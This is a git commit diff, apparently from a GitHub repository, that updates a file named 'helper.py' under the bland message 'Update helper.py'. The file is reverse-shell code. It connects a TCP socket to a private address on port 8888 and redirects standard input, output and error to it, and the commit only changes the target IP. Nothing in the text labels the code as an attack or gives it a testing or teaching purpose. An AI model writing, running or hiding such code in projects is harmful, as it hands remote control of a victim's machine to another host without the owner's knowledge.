4068684c758781d239996fc89621bafe1c53c2cc
Boic <73367117+Boic69@users.noreply.github.com>
2021-11-17 15:47:14 +0100

    Update helper.py

--- helper.py
+++ helper.py
@@ -1,7 +1,7 @@
 import os, subprocess, socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.0.14", 8888))
+s.connect(("10.0.0.15", 8888))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
